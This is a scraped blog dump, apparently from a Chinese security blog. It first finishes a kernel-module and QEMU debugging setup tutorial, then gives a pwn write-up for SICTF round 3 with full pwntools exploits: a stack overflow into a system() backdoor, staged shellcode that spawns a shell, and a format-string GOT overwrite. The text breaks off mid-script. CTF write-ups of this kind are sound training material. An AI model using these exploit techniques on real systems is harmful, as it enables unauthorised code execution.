directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span><span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"Dual BSD/GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">ko_test_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"This is a test ko!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">ko_test_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"Bye Bye~\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">module_init</span><span class="token punctuation">(</span>ko_test_init<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">module_exit</span><span class="token punctuation">(</span>ko_test_exit<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>Makefile</code>文件</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile">obj-m <span class="token operator">+=</span> pwn.oKDIR <span class="token operator">=</span>/home/starrysky/kernel/linux-5.4.98<span class="token target symbol">all</span><span class="token punctuation">:</span><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KDIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span>PWD<span class="token punctuation">)</span> modules<span class="token target symbol">clean</span><span class="token punctuation">:</span>rm -rf *.o *.ko *.mod.* *.symvers *.order<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中<code>obj-m</code>指定了要声称的模块，后面接<code>c</code>源码文件名<code>.o</code>，<code>KDIR</code>为内核源码路径</p><pre class="line-numbers language-makefile" data-language="makefile"><code class="language-makefile"><span class="token variable">$</span><span class="token punctuation">(</span>MAKE<span class="token punctuation">)</span> -C <span class="token variable">$</span><span class="token punctuation">(</span>KDIR<span class="token punctuation">)</span> M<span class="token operator">=</span><span class="token variable">$</span><span class="token punctuation">(</span>PWD<span class="token punctuation">)</span> modules<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><code>-C</code> 表示进入到指定的内核目录</p><p><code>M</code> 指定驱动源码的环境，<code>M</code>并不是 <code>Makefile</code> 的选项，而是内核根目录下 <code>Makefile</code> 中使用的变量。这会使得该 <code>Makefile</code> 在构造模块之前返回到 <code>M</code> 指定的目录，并在指定的目录中生成驱动模块</p><p>最后运行<code>sudo make</code>编译内核驱动</p><pre class="line-numbers language-none"><code class="language-none">☁  pwn  lsMakefile  modules.order  Module.symvers  pwn.c  pwn.ko  pwn.mod  pwn.mod.c  pwn.mod.o  pwn.o<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>虽然正常人不会这样但是要注意文件名不要用<code>make</code>（嗯我就是那个非正常人类</p><h2 id="Qemu-模拟环境"><a href="#Qemu-模拟环境" class="headerlink" title="Qemu 模拟环境"></a>Qemu 模拟环境</h2><h3 id="准备"><a href="#准备" class="headerlink" title="准备"></a>准备</h3><p>安装<code>qemu</code>和<code>busybox</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> qemu<span class="token function">wget</span> https://busybox.net/downloads/busybox-1.32.1.tar.bz2<span class="token function">tar</span> <span class="token parameter variable">-jxf</span> busybox-1.32.1.tar.bz2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>配置<code>busybox</code>,在 <code>Setttings</code> 选中 <code>Build static binary (no shared libs)</code>，将 <code>busybox</code> 编译为静态链接的文件；在 <code>Linux System Utilities</code> 中取消选中 <code>Support mounting NFS file systems on Linux &lt; 2.6.23 (NEW)；</code>在 <code>Networking Utilities</code> 中取消选中 <code>inetd</code>，最后编译</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">make</span> menuconfig<span class="token function">make</span> <span class="token parameter variable">-j</span> <span class="token number">8</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="配置文件系统"><a href="#配置文件系统" class="headerlink" title="配置文件系统"></a>配置文件系统</h3><p>使用 <code>make install</code>命令，将生成文件夹<code>_install</code>，该目录将成为 <code>rootfs</code>，在该文件夹下创建文件夹</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mkdir</span> <span class="token parameter variable">-p</span>  proc sys dev etc/init.d<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>再创建一个<code>init</code>文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token builtin class-name">echo</span> <span class="token string">"INIT SCRIPT"</span><span class="token function">mkdir</span> /tmp<span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs none /sys<span class="token function">mount</span> <span class="token parameter variable">-t</span> devtmpfs none /dev<span class="token function">mount</span> <span class="token parameter variable">-t</span> debugfs none /sys/kernel/debug<span class="token function">mount</span> <span class="token parameter variable">-t</span> tmpfs none /tmp<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds"</span>setsid /bin/cttyhack setuidgid <span class="token number">0</span> /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>打包文件系统</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span> cpio <span class="token parameter variable">-o</span> <span class="token parameter variable">--format</span><span class="token operator">=</span>newc <span class="token operator">></span> <span class="token punctuation">..</span>/rootfs.img<span class="token comment"># 解包命令</span><span class="token comment"># cpio -idmv &lt; rootfs.img</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="启动内核"><a href="#启动内核" class="headerlink" title="启动内核"></a>启动内核</h3><p>脚本如下，<code>bzImage</code>就是之前内核里的<code>bzImage</code>,<code>rootfs.img</code>是打包文件系统时（上一步）创建的，<code>nographic</code>关闭了图形界面，<code>console=ttyS0</code>将输出重定向到了终端</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>  <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>  <span class="token parameter variable">-kernel</span> <span class="token punctuation">..</span>/arch/x86/boot/bzImage <span class="token punctuation">\</span>  <span class="token parameter variable">-initrd</span> ./rootfs.img <span class="token punctuation">\</span>  <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 kaslr"</span> <span class="token punctuation">\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这样就启动好了</p><pre class="line-numbers language-none"><code class="language-none">INIT SCRIPTBoot took 6.24 seconds&#x2F; # lsbin      etc      linuxrc  root     sys      usrdev      init     proc     sbin     tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="加载驱动"><a href="#加载驱动" class="headerlink" title="加载驱动"></a>加载驱动</h3><p>将之前写的驱动复制到<code>_install</code>文件夹下，改一下<code>init</code>文件</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span><span class="token builtin class-name">echo</span> <span class="token string">"INIT SCRIPT"</span><span class="token function">mkdir</span> /tmp<span class="token function">mount</span> <span class="token parameter variable">-t</span> proc none /proc<span class="token function">mount</span> <span class="token parameter variable">-t</span> sysfs none /sys<span class="token function">mount</span> <span class="token parameter variable">-t</span> devtmpfs none /dev<span class="token function">mount</span> <span class="token parameter variable">-t</span> debugfs none /sys/kernel/debug<span class="token function">mount</span> <span class="token parameter variable">-t</span> tmpfs none /tmpinsmod /1.ko<span class="token builtin class-name">echo</span> <span class="token parameter variable">-e</span> <span class="token string">"Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> <span class="token parameter variable">-f1</span> /proc/uptime<span class="token variable">)</span></span> seconds"</span>setsid /bin/cttyhack setuidgid <span class="token number">0</span> /bin/sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>重新打包再运行，可以看到加载成功了，显示了<code>This is a test ko!</code></p><pre class="line-numbers language-none"><code class="language-none">INIT SCRIPT[    6.129377] pwn: loading out-of-tree module taints kernel.[    6.133147] pwn: module verification failed: signature and&#x2F;or required key missing - tainting kernel[    6.147188] This is a test ko!Boot took 6.13 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h2><h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>查看装载的驱动</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">lsmod<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>获取驱动加载的基地址</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">grep</span> target_module_name /proc/modules <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="启动调试"><a href="#启动调试" class="headerlink" title="启动调试"></a>启动调试</h3><p>在启动脚本里加<code>-s</code>，表示<code>-gdb tcp::1234</code></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>qemu-system-x86_64 <span class="token punctuation">\</span>  <span class="token parameter variable">-nographic</span> <span class="token punctuation">\</span>  <span class="token parameter variable">-kernel</span> <span class="token punctuation">..</span>/arch/x86/boot/bzImage <span class="token punctuation">\</span>  <span class="token parameter variable">-initrd</span> ./rootfs.img <span class="token punctuation">\</span>  <span class="token parameter variable">-append</span> <span class="token string">"console=ttyS0 kaslr"</span> <span class="token punctuation">\</span>  <span class="token parameter variable">-s</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>启动之后<code>gdb</code>连接上去调试</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gdb <span class="token parameter variable">-q</span> <span class="token parameter variable">-ex</span> <span class="token string">"target remote localhost:1234"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接成功</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">pwndbg: loaded <span class="token number">147</span> pwndbg commands and <span class="token number">47</span> shell commands. Type pwndbg <span class="token punctuation">[</span>--shell <span class="token operator">|</span> --all<span class="token punctuation">]</span> <span class="token punctuation">[</span>filter<span class="token punctuation">]</span> <span class="token keyword">for</span> a list.pwndbg: created <span class="token variable">$rebase</span>, <span class="token variable">$ida</span> GDB functions <span class="token punctuation">(</span>can be used with print/break<span class="token punctuation">)</span>Remote debugging using localhost:1234warning: No executable has been specified and target does not supportdetermining executable automatically.  Try using the <span class="token string">"file"</span> command.0xffffffffa1dfea1e <span class="token keyword">in</span> ?? <span class="token punctuation">(</span><span class="token punctuation">)</span>------- tip of the day <span class="token punctuation">(</span>disable with <span class="token builtin class-name">set</span> show-tips off<span class="token punctuation">)</span> -------Use GDB's dprintf <span class="token builtin class-name">command</span> to print all calls to given function. E.g. dprintf malloc, <span class="token string">"malloc(%p)<span class="token entity" title="\n">\n</span>"</span>, <span class="token punctuation">(</span>void*<span class="token punctuation">)</span><span class="token variable">$rdi</span> will print all malloc callsPermission error when attempting to parse page tables with gdb-pt-dump.Either change the kernel-vmmap setting, re-run GDB as root, or disable <span class="token variable"><span class="token variable">`</span>ptrace_scope<span class="token variable">`</span></span> <span class="token punctuation">(</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">echo</span> <span class="token number">0</span> <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">tee</span> /proc/sys/kernel/yama/ptrace_scope<span class="token variable">`</span></span><span class="token punctuation">)</span>LEGEND: STACK <span class="token operator">|</span> HEAP <span class="token operator">|</span> CODE <span class="token operator">|</span> DATA <span class="token operator">|</span> RWX <span class="token operator">|</span> RODATA<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.z1r0.top/2021/10/21/%E5%86%85%E6%A0%B8%E4%B8%8B%E8%BD%BD%E4%B8%8E%E7%BC%96%E8%AF%91/#/">https://www.z1r0.top/2021/10/21/%E5%86%85%E6%A0%B8%E4%B8%8B%E8%BD%BD%E4%B8%8E%E7%BC%96%E8%AF%91/#/</a></p><p><a href="https://ctf-wiki.org/pwn/linux/kernel-mode/environment/readme/#/">https://ctf-wiki.org/pwn/linux/kernel-mode/environment/readme/#/</a></p>]]></content>
      
      
      <categories>
          
          <category> kernel </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SICTF-round3-2024-pwn</title>
      <link href="/2024/02/27/sictf-round3-2024-pwn/"/>
      <url>/2024/02/27/sictf-round3-2024-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="stack"><a href="#stack" class="headerlink" title="stack"></a>stack</h2><p><code>run</code>函数<code>return</code>了<code>strdup(buf)</code>，也就是将输入的内容直接返回了</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">char</span> <span class="token operator">*</span><span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">76</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-50h] BYREF</span>  <span class="token class-name">size_t</span> nbytes<span class="token punctuation">;</span> <span class="token comment">// [rsp+4Ch] [rbp-4h]</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Give me the length: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">LODWORD</span><span class="token punctuation">(</span>nbytes<span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token function">get_int</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>nbytes <span class="token operator">></span> <span class="token number">0x40u</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Too long!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Give me your command: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>nbytes<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">strdup</span><span class="token punctuation">(</span>buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>存在后门函数，但是不能直接控制程序流到这个程序，因为只有当输入内容是<code>give me flag</code>才能执行<code>system</code>，但是执行的内容却是<code>give me flag</code>，所以直接控制程序到执行<code>system</code>的地址，并且参数就是之前输入的内容，在输出的时候<code>/bin/sh</code>后面需要用<code>\x00</code>截断</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __fastcall <span class="token function">backdoor</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>a1<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strncmp</span><span class="token punctuation">(</span>a1<span class="token punctuation">,</span> <span class="token string">"give me flag"</span><span class="token punctuation">,</span> <span class="token number">0xCuLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Nope!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You got!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">system</span><span class="token punctuation">(</span>a1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'yuanshen.life'</span><span class="token punctuation">,</span> <span class="token number">33057</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>backdoor <span class="token operator">=</span> <span class="token number">0x4011F4</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Give me the length: '</span><span class="token punctuation">,</span> <span class="token string">b'256'</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'/bin/sh\x00'</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x50</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>backdoor<span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'Give me your command: '</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Bug-Zapper"><a href="#Bug-Zapper" class="headerlink" title="Bug_Zapper"></a>Bug_Zapper</h2><p>限制了读的长度小于等于<code>0x10</code>，可以先写<code>shellcode</code>执行<code>read</code>再次读，改<code>rdx</code>来读入更长的<code>shellcode</code>，最后读入<code>pwntools</code>直接生成的<code>shellcode</code>来<code>getshell</code></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int64<span class="token punctuation">)</span><span class="token function">sys_read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token number">0x1919810</span><span class="token punctuation">,</span> <span class="token number">0x100uLL</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">0x10</span> <span class="token punctuation">)</span>    __asm <span class="token punctuation">&#123;</span> syscall<span class="token punctuation">;</span> LINUX <span class="token operator">-</span> sys_creat <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>file_name <span class="token operator">=</span> <span class="token string">'./pwn'</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">0</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">26870</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>    r <span class="token operator">=</span> process<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span>file_name<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token triple-quoted-string string">'''mov     esi, eaxxor     eax, eaxxor     edi, edimov     edx, esisyscall '''</span>shellcode <span class="token operator">=</span> <span class="token string">b'\x89\xc6\x31\xc0\x31\xff\x89\xf2\x0f\x05'</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'you'</span><span class="token punctuation">,</span> shellcode<span class="token punctuation">)</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>p <span class="token operator">=</span> <span class="token string">b'\x90'</span> <span class="token operator">*</span> <span class="token number">0xa</span> <span class="token operator">+</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>send<span class="token punctuation">(</span>p<span class="token punctuation">)</span>r<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Easy-SI"><a href="#Easy-SI" class="headerlink" title="Easy_SI"></a>Easy_SI</h2><p>盲打格式化字符串，先随便输出一段地址得到一些基本信息：</p><ul><li><p>栈中必定存在一个地址是<code>__libc_start_main - 128</code>，已知<code>libc</code>版本，将几个<code>libc</code>地址都减去<code>__libc_start_main + 128</code>，得到<code>libc</code>地址</p></li><li><p>几次输出的程序段地址都相同说明没有开<code>pie</code></p></li></ul><p>最终思路大概就是改<code>printf_got</code>为<code>ogg</code>了，随便改几个地址会发现可写段从<code>0x404000</code>开始，<code>got</code>基本也就在这一段，从<code>0x404000</code>向后<code>0x8</code>的尝试，改为<code>ogg</code>，最终确定<code>printf_got</code>在<code>0x404030</code></p><p>exp</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment">#32位arch=‘i386’</span>li <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;214m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>ll <span class="token operator">=</span> <span class="token keyword">lambda</span> x <span class="token punctuation">:</span> <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'\x1b[01;38;5;1m'</span> <span class="token operator">+</span> x <span class="token operator">+</span> <span class="token string">'\x1b[0m'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'tmux'</span><span class="token punctuation">,</span><span class="token string">'splitw'</span><span class="token punctuation">,</span><span class="token string">'-h'</span><span class="token punctuation">]</span>debug <span class="token operator">=</span> <span class="token number">1</span><span class="token keyword">if</span> debug<span class="token punctuation">:</span>    r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'yuanshen.life'</span><span class="token punctuation">,</span> <span class="token number">34046</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>r<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc.so.6'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b'the game!!!'</span><span class="token punctuation">,</span> <span class="token string">b'%49$p'</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'0x'</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__libc_start_main'</span><span class="token punctuation">]</span>  <span class="token operator">-</span> <span class="token number">128</span>system <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span> <span class="token operator">+</span> libc_baseprintf_got <span class="token operator">=</span> <span class="token number">0x404030</span>p <span class="token operator">=</span> fmtstr_payload<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>printf_got<span class="token punctuation">:</span>system<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>r<span class="token punctuation">.</span>sendline<span class="token 